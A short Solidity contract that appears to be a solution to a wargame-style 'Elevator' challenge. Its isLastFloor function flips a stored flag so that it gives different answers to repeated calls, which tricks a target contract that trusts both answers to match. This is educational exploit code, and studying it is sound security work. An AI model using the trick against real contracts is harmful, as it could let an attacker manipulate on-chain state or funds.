// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Elevator {
    function goTo(uint) external;
}

contract Building {
  bool public top;
  uint public floor;
  bool signal = true;

  Elevator elevator;

  constructor(address _address) public {
      elevator = Elevator(_address);
  }

    function isLastFloor(uint _floor) public returns (bool) {
        bool trick_floor = signal;
        trick_floor = !signal;
        signal = !signal;
        return trick_floor;
    }

    function _goto(uint _floor) public {
        elevator.goTo(_floor);
    }

}
